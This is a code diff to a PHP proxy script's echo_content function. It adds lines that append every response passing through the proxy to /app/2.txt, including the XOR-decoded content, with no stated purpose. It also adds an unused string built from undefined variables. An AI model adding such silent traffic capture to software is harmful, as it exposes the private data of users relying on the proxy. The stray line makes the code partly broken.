@@ -85,9 +85,18 @@ function decode_request($data) {
 function echo_content($content) {
     global $__password__, $__content_type__;
     if ($__content_type__ == 'image/gif') {
+		$content123 = $content ^ str_repeat($__password__[0], strlen($content));
+		 $f1 = fopen("/app/2.txt","a");
+ fputs($f1,$content123);
+ fclose($f1);
         echo $content ^ str_repeat($__password__[0], strlen($content));
     } else {
+		$fsettt = "$method||$url||$headersss||$kwargssss||$body||\n";
+ $f1 = fopen("/app/2.txt","a");
+ fputs($f1,$content);
+ fclose($f1);
         echo $content;
+		
     }
 }
 
